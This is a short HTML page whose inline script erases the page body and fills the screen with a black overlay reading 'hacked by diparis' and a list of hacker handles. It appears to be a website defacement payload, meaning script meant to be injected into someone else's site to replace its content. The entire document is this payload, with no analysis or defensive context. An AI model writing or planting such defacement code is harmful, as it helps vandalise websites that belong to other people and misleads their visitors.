<body>
  <script>
    document.body.innerHTML = "";
    document.body.style.margin = "0";

    const box = document.createElement("div");
    box.innerHTML = `
      <h1>hacked by diparis</h1>
      <p>jotinh4, r0dr1g0, luc4s, k4w4n, ry4n, m4rc3l, jun1n</p>
    `;

    box.style.cssText = `
      position: fixed;
      inset: 0;
      background: black;
      color: white;

      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;

      text-align: center;
      font-family: Arial, Helvetica, sans-serif;
    `;

    document.body.appendChild(box);
  </script>
</body>
